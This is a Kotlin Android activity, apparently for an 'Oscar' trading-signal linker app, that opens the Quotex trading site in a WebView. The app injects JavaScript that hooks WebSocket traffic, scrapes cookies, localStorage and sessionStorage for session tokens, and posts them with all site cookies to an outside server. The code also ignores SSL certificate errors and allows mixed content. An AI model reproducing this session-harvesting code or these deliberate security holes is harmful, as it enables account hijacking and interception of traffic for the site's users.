package com.oscar.linker

import android.annotation.SuppressLint
import android.content.Context
import android.content.SharedPreferences
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.ViewGroup
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var statusBar: TextView
    private lateinit var btnSettings: Button
    private lateinit var btnMarket: Button
    private lateinit var licenseKey: String
    private lateinit var prefs: SharedPreferences

    private var currentTab = "settings"
    private var linkingMode = false
    private var lastSentSsid: String? = null
    private var sentCount = 0

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private val BASE_URL = "https://signal-bott.onrender.com"
    private val SERVER_URL = "$BASE_URL/api/link"
    private val QX_DOMAIN = "https://quotex.com"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs = getSharedPreferences("oscar_prefs", Context.MODE_PRIVATE)
        val saved = prefs.getString("license_key", null)
        if (saved.isNullOrBlank()) showKeyDialog()
        else { licenseKey = saved; setupUi(); showSettings() }
    }

    private fun showKeyDialog() {
        val input = EditText(this).apply { hint = "OSCAR-XXXX-XXXX-XXXX"; setSingleLine() }
        AlertDialog.Builder(this)
            .setTitle("🔑 أدخل مفتاح التفعيل")
            .setMessage("ضع مفتاح OSCAR الخاص بك")
            .setView(input)
            .setCancelable(false)
            .setPositiveButton("متابعة") { _, _ ->
                val k = input.text.toString().trim().uppercase()
                if (k.isEmpty()) { finish(); return@setPositiveButton }
                licenseKey = k
                prefs.edit().putString("license_key", k).apply()
                setupUi()
                showSettings()
            }
            .setNegativeButton("إلغاء") { _, _ -> finish() }
            .show()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupUi() {
        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }

        statusBar = TextView(this).apply {
            text = "📊 الإعدادات"
            textSize = 14f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#1a1a1a"))
            setPadding(30, 25, 30, 25)
            gravity = Gravity.CENTER
        }

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }

        val bottomBar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0d0d0d"))
        }

        btnSettings = Button(this).apply {
            text = "📊 الإعدادات"
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            setOnClickListener { showSettings() }
        }

        btnMarket = Button(this).apply {
            text = "📈 السوق"
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            setOnClickListener { showMarket() }
        }

        bottomBar.addView(btnSettings)
        bottomBar.addView(btnMarket)

        root.addView(statusBar)
        root.addView(webView)
        root.addView(bottomBar)
        setContentView(root)
        configureWebView()
    }

    @SuppressLint("SetJavaScriptEnabled", "AddJavascriptInterface")
    private fun configureWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 " +
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        webView.addJavascriptInterface(Bridge(), "OscarBridge")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(view: WebView?, handler: android.webkit.SslErrorHandler?, error: android.net.http.SslError?) {
                handler?.proceed()
            }

            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                super.onPageStarted(view, url, favicon)
                if (url?.contains("quotex.com") == true) injectInterceptor()
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                if (url.contains("quotex.com")) {
                    injectInterceptor()
                    if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard")) {
                        statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري التقاط الجلسة..."
                        tryCaptureAll()
                        Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 2000)
                        Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 5000)
                    }
                }
            }
        }
    }

    private fun showSettings() {
        currentTab = "settings"
        linkingMode = false
        statusBar.text = "📊 الإعدادات"
        updateTabButtons()
        webView.loadUrl("$BASE_URL/app_login/$licenseKey")
    }

    private fun showMarket() {
        currentTab = "market"
        statusBar.text = "📈 السوق — سجّل دخولك إلى Quotex"
        updateTabButtons()
        webView.loadUrl("$QX_DOMAIN/ar/trade")
    }

    private fun updateTabButtons() {
        if (currentTab == "settings") {
            btnSettings.setBackgroundColor(Color.parseColor("#d4af37"))
            btnSettings.setTextColor(Color.BLACK)
            btnMarket.setBackgroundColor(Color.parseColor("#2a2a2a"))
            btnMarket.setTextColor(Color.WHITE)
        } else {
            btnSettings.setBackgroundColor(Color.parseColor("#2a2a2a"))
            btnSettings.setTextColor(Color.WHITE)
            btnMarket.setBackgroundColor(Color.parseColor("#d4af37"))
            btnMarket.setTextColor(Color.BLACK)
        }
    }

    private fun tryCaptureAll() {
        tryCaptureFromCookies()
        tryCaptureFromStorage()
    }

    private fun tryCaptureFromCookies() {
        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: return
        for (name in listOf("ssid", "session", "token", "authorization", "auth")) {
            val v = cookies.split(";").map { it.trim() }
                .firstOrNull { it.startsWith("$name=") }?.substringAfter("=")
            if (v != null && v.length > 20) {
                sendSsid(v)
                return
            }
        }
    }

    private fun tryCaptureFromStorage() {
        val js = """
            (function() {
                try {
                    var keys = ['session','token','ssid','auth','authorization','user','account'];
                    var found = null;
                    function scan(storage) {
                        for (var i = 0; i < keys.length; i++) {
                            var v = storage.getItem(keys[i]);
                            if (!v) continue;
                            if (v.length > 20 && v.length < 5000 && !found) found = v;
                            try {
                                var o = JSON.parse(v);
                                if (o) {
                                    ['token','session','ssid','authorization','access_token'].forEach(function(k){
                                        if (o[k] && typeof o[k] === 'string' && o[k].length > 20 && !found) found = o[k];
                                    });
                                }
                            } catch(e){}
                        }
                    }
                    scan(localStorage);
                    scan(sessionStorage);
                    if (found && window.OscarBridge) window.OscarBridge.onSsid(found);
                } catch(e){}
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    private fun injectInterceptor() {
        val js = """
            (function() {
                if (window.__oscarHooked2) return;
                window.__oscarHooked2 = true;

                function push(v) {
                    if (v && typeof v === 'string' && v.length > 20 && v.length < 5000) {
                        if (window.OscarBridge) window.OscarBridge.onSsid(v);
                    }
                }

                var OrigWS = window.WebSocket;
                var hookedWS = function(url, protocols) {
                    try {
                        if (url) {
                            var patterns = [
                                /[?&]token=([^&]+)/,
                                /[?&]session=([^&]+)/,
                                /[?&]ssid=([^&]+)/,
                                /[?&]auth=([^&]+)/
                            ];
                            for (var i = 0; i < patterns.length; i++) {
                                var m = url.match(patterns[i]);
                                if (m && m[1]) push(decodeURIComponent(m[1]));
                            }
                        }
                    } catch(e){}
                    var ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
                    try {
                        ws.addEventListener('message', function(ev) {
                            try {
                                var d = ev.data;
                                if (typeof d !== 'string') return;
                                var pats = [
                                    /"session"\s*:\s*"([^"]+)"/,
                                    /"token"\s*:\s*"([^"]+)"/,
                                    /"ssid"\s*:\s*"([^"]+)"/,
                                    /"authorization"\s*:\s*"([^"]+)"/,
                                    /"access_token"\s*:\s*"([^"]+)"/,
                                    /"jwt"\s*:\s*"([^"]+)"/
                                ];
                                for (var i = 0; i < pats.length; i++) {
                                    var m = d.match(pats[i]);
                                    if (m && m[1]) { push(m[1]); break; }
                                }
                            } catch(e){}
                        });
                        ws.addEventListener('open', function() {
                            tryCapture();
                        });
                    } catch(e){}
                    return ws;
                };
                hookedWS.prototype = OrigWS.prototype;
                hookedWS.CONNECTING = OrigWS.CONNECTING;
                hookedWS.OPEN = OrigWS.OPEN;
                hookedWS.CLOSING = OrigWS.CLOSING;
                hookedWS.CLOSED = OrigWS.CLOSED;
                window.WebSocket = hookedWS;
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    inner class Bridge {
        @JavascriptInterface
        fun onSsid(ssid: String) {
            if (ssid.length < 20) return
            sendSsid(ssid)
        }

        @JavascriptInterface
        fun tryCapture() {
            runOnUiThread { tryCaptureAll() }
        }

        @JavascriptInterface
        fun openMarket() {
            runOnUiThread { showMarket() }
        }

        @JavascriptInterface
        fun openSettings() {
            runOnUiThread { showSettings() }
        }

        @JavascriptInterface
        fun logout() {
            prefs.edit().remove("license_key").apply()
            runOnUiThread { recreate() }
        }
    }

    private fun sendSsid(ssid: String) {
        if (ssid == lastSentSsid && sentCount > 0) return
        if (sentCount > 5) return

        lastSentSsid = ssid
        sentCount++
        statusBar.text = "🔗 جاري إرسال الجلسة للسيرفر (محاولة $sentCount)..."

        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val payload = JSONObject().apply {
                    put("license_key", licenseKey)
                    put("ssid", ssid)
                    put("cookies", cookies)
                    put("email", "")
                }
                val request = Request.Builder()
                    .url(SERVER_URL)
                    .post(payload.toString().toRequestBody("application/json".toMediaType()))
                    .build()
                val response = client.newCall(request).execute()
                val json = JSONObject(response.body?.string() ?: "{}")

                withContext(Dispatchers.Main) {
                    if (json.optBoolean("ok")) {
                        statusBar.text = "✅ تم ربط الحساب بنجاح! جاري العودة للإعدادات..."
                        Toast.makeText(this@MainActivity, "✅ تم ربط الحساب", Toast.LENGTH_LONG).show()
                        sentCount = 0
                        Handler(Looper.getMainLooper()).postDelayed({ showSettings() }, 800)
                    } else {
                        val err = json.optString("error", "خطأ")
                        statusBar.text = "⚠️ فشلت المحاولة $sentCount: $err"
                        if (sentCount < 5) {
                            Handler(Looper.getMainLooper()).postDelayed({ tryCaptureAll() }, 3000)
                        } else {
                            statusBar.text = "❌ لم نتمكن من التقاط الجلسة تلقائياً. اضغط على زر الإعدادات ثم حاول مجدداً"
                        }
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    statusBar.text = "⚠️ خطأ اتصال: ${e.message}"
                }
            }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (currentTab == "market") showSettings()
        else if (::webView.isInitialized && webView.canGoBack()) webView.goBack()
        else super.onBackPressed()
    }
}
